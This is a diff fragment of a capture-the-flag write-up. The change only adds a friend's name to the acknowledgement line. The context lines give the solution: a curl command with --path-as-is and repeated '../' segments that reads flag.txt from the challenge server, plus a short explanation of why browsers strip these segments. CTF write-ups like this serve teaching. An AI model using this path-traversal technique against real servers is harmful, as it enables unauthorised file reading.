@@ -3,7 +3,7 @@
 solution:
 `curl --verbose --path-as-is 'http://skrctf.me:400/../../../../../../flag.txt'`
 
-*Thanks to my friend who help me for the chal with a clear and understanding explaination*
+*Thanks to my friend(Tzion) who help me for the chal with a clear and understanding explaination*
 ```
 Because browser will automatically interpret ../../.../../../ before passing to server, meaning that if u type http://xxx.com/../../../../flag.txt in browser will resulted in http://xxx.com/flag.txt before passing to server.
 
